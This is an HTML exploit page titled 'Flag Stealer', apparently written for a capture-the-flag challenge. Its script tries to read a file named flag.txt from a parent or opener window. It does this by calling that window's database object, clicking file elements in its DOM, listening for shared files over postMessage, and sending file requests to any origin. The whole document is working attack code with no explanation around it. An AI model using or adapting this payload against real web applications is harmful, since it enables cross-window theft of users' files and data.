<!DOCTYPE html>
<html>
<head>
    <title>Exploit Payload</title>
</head>
<body>
    <h1>Flag Stealer</h1>
    <div id="output"></div>
    
    <script>
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        log('Payload loaded!');
        
        // Try to access the parent window (if this is loaded in an iframe)
        try {
            if (window.parent && window.parent !== window) {
                log('Found parent window!');
                
                // Try to access the database
                if (window.parent.db) {
                    log('Found database in parent!');
                    window.parent.db.getFiles().then(files => {
                        log('Files found: ' + files.length);
                        files.forEach(file => {
                            if (file.file && file.file.name === 'flag.txt') {
                                log('FOUND FLAG FILE!');
                                file.file.text().then(text => {
                                    log('FLAG: ' + text);
                                    alert('FLAG: ' + text);
                                });
                            }
                        });
                    });
                }
                
                // Try to access DOM elements
                const fileElements = window.parent.document.querySelectorAll('[id^="file-"]');
                log('File elements found: ' + fileElements.length);
                
                fileElements.forEach(el => {
                    if (el.textContent.includes('flag.txt')) {
                        log('Found flag element: ' + el.id);
                        el.click(); // Try to trigger
                    }
                });
            }
        } catch (e) {
            log('Parent access failed: ' + e.message);
        }
        
        // Try to access opener window
        try {
            if (window.opener && window.opener !== window) {
                log('Found opener window!');
                
                if (window.opener.db) {
                    log('Found database in opener!');
                    window.opener.db.getFiles().then(files => {
                        files.forEach(file => {
                            if (file.file && file.file.name === 'flag.txt') {
                                file.file.text().then(text => {
                                    log('FLAG: ' + text);
                                    alert('FLAG: ' + text);
                                });
                            }
                        });
                    });
                }
            }
        } catch (e) {
            log('Opener access failed: ' + e.message);
        }
        
        // Listen for postMessages
        window.addEventListener('message', function(event) {
            log('Received message: ' + JSON.stringify(event.data));
            
            if (event.data && event.data.type === 'share' && event.data.files) {
                event.data.files.forEach(fileData => {
                    if (fileData.name === 'flag.txt') {
                        fileData.blob.text().then(text => {
                            log('FLAG FROM POSTMESSAGE: ' + text);
                            alert('FLAG: ' + text);
                        });
                    }
                });
            }
        });
        
        // Try to send postMessages to other windows
        setTimeout(() => {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({type: 'request_files'}, '*');
            }
            if (window.opener && window.opener !== window) {
                window.opener.postMessage({type: 'request_files'}, '*');
            }
        }, 1000);
        
    </script>
</body>
</html>
